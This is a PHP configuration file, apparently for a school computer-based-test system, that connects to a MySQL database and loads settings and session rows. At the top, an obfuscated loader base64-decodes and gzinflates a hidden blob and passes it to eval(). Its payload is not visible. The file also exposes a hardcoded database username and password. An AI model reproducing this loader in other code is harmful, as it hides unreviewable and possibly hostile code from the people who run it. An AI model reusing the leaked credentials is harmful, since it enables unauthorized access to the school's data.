<?php
$SISTEMIT_COM_ENC = "3dS9qqtMFAbg/sC5ic0uziaF/zFhkyLGn6hR4+honGaDggEdxdhEva9zQSGQQrGwsBLhJOm+W/jKgVnPMO9aM79/fTqq40qG6v7sLONHMnd/N38/qkGvwsvjKm/D8+xpsfoo7c6SO2nBtpdEJYVB24bBxVRjydmNthUIokbeXGZ5NuXUVW0Ui9te294fJpnfLQvEh2USMSxxTJsiOwe+f55480q0h2NDP4gONRo0hWihpEkbk9a8hcivrWOlyVvvdrnIa+m0peckGK9Swdwt3X0kuYeJSF/uYcuG/I08RM4ppMOuXmVqgIoF/ShJzlmN7Op2gKXgrVQ9XK0bntIqlYeLeJFN0RnRrGPH5XJxqCaAp+ys34MuHImWnwuzjYqwJVmQ7fzeL462yALxdqXp4Cz2NZNmy1DoVpiS2TWtHRjeisyreyVcRI1K42m9ke5EY41UdRhdIgxYuydXPK/0u1IsCt3vrvVJIIL+OnZd76/DenmAgsEFF3hnQU1LI38rI1QNCeD0lqLVmgiqLOvy5OEso24/66NMWhoU8MO8V4S36rXAkgglxhROFUfAeeXKyFQOHnXBw41OuU5ECGxz9xgslrhR9oy7nyk1OfKafyUXVlAtkvkkAD6NiG2FbxzB2cyqx6XCPkjXc22uxI2+4vTb1Qf7uhYC+UHIYcYZVHNKx56pg5kuJCUGM7za0RwPt3kx8Pf6AsSqsRnOyPFF6dkAAR6GHZPYJeKF2Rjuk74TvWJN7M1TW9zJYEWA+aRY8mOd6PgcT1x2rOOYcNmVEG0+vj/LMR824fiYluzPMEW3Yfrz4aTRM3ZQ2C7WAG3TgRdRoa/tQSKMkO4L3+utUOIuMEMjoNAlSDQnlFoRYuB6KedBDCsHI8WCABqinD3XFJBad2wGCfpr3abkcqSNBuZPXxRyj8GZAQtuoFl68s3G6VozTCsRJYM+nYa7KZtJRN5m4HOGTaPWyTETJoMbMKZ+aIS7K5lZ9K7nSEiD1GWiq0OaYCQL3XmOeJAOJqIEP6I5BOmnn2jl2xflt+/jt19byssH5dvPTO7lG9nw8lMjffup/arPsRDiHkYkJyK61Z3na0MkFmHuIV/GOZTN3ZQB1clQEnrodb4y4sJ97k0MSuOenvO8535SCsOmNOqZJ4qkNWO8MvRb3cf9OCray+5CGNQOBZqjvdl8fH1P84j//Ldd7xZ+fX1/Oq513Hz8X/6Yj+/fv/4B";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FAbg/sC5ic0uziaF/zFhkyLGn6hR4+honGaDggEdxdhEva9zQSGQQrGwsBLhJOm+W/jKgVnPMO9aM79/fTqq40qG6v7sLONHMnd/N38/qkGvwsvjKm/D8+xpsfoo7c6SO2nBtpdEJYVB24bBxVRjydmNthUIokbeXGZ5NuXUVW0Ui9te294fJpnfLQvEh2USMSxxTJsi";
?>
<?php
$debe = 'n1563337_cbt';
$koneksi = mysqli_connect("localhost", "n1563337_websmkdwk", "SMKDWK_20213ok!", "");
if ($koneksi) {
	$pilihdb = mysqli_select_db($koneksi, $debe);
	if ($pilihdb) {
		$query = mysqli_query($koneksi, "SELECT * FROM setting WHERE id_setting='1'");
		if ($query) {
			$setting = mysqli_fetch_array($query);
			mysqli_set_charset($koneksi, 'utf8');
			$sess = mysqli_fetch_array(mysqli_query($koneksi, "SELECT * FROM session WHERE id='1'"));
			date_default_timezone_set($setting['waktu']);
		}
	}
}
